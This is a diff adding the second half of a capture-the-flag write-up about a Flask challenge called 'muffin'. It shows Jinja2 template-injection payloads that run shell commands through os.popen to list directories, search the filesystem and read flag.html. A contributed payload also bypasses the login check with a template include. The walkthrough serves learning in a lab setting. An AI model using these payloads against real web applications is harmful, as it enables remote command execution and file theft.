@@ -93,3 +93,62 @@ I've used
 {{ config.__class__.__init__.__globals__['os'].popen('la -al').read() }}
 ```
 {% endraw %}
+
+to list the content of the current direcory.
+
+Then I've used
+{% raw %}
+{{config.__class__.__init__.__globals__['os'].popen('find / -name \\*flag\\* > find.txt && cat find.txt').read()}}
+{% endraw %}
+
+as input for the username to search for all files that contain *flag* in it's name and afterwards cat the results out.
+
+![muffin-ssti-ls-cat](/assets/img/muffin-ssti-ls-cat.png)
+
+And got this as results
+
+![muffin-ssti-ls-cat-output](/assets/img/muffin-ssti-ls-cat-output.png)
+
+So finally the last step was to use
+
+{% raw %}
+{{config.__class__.__init__.__globals__['os'].popen('cat /app/templates/flag.html').read()}}
+{% endraw %}
+
+
+to get the content of flag.html
+
+![muffin-flag](/assets/img/muffin-flag.png)
+
+
+## Lexiea's Way
+
+User Lexiea found another, way smarter solution and shared it after the official solution was provided.
+
+![muffin-lexiea-solution](/assets/img/muffin-lexiea-solution.png)
+
+_Damn, that was smart._
+
+I tried this method on my own and entered 
+
+{% raw %}
+{% set logged_in = true %}{% include 'flag.html' %}
+{% endraw %}
+
+
+And voilà we get the flag without using a lot of SSTI kung-fu.  
+
+![muffin-lexieia-flag](/assets/img/muffin-lexieia-flag.png)
+
+
+## My Learnings
+
+- When XSS and SQLi don't work, try SSTI
+- It's super useful to understand how  ```@requires_login``` in Python Flask works
+- [book.hacktricks.xyz](https://book.hacktricks.xyz) is an awesome resource and always a look worth
+
+## Acknowledgments
+
+Thanks a lot to Ostschweizer Fachhochschule for organizing this CTF event. 
+
+Thanks to Lexia for sharing the smarter solution with us!
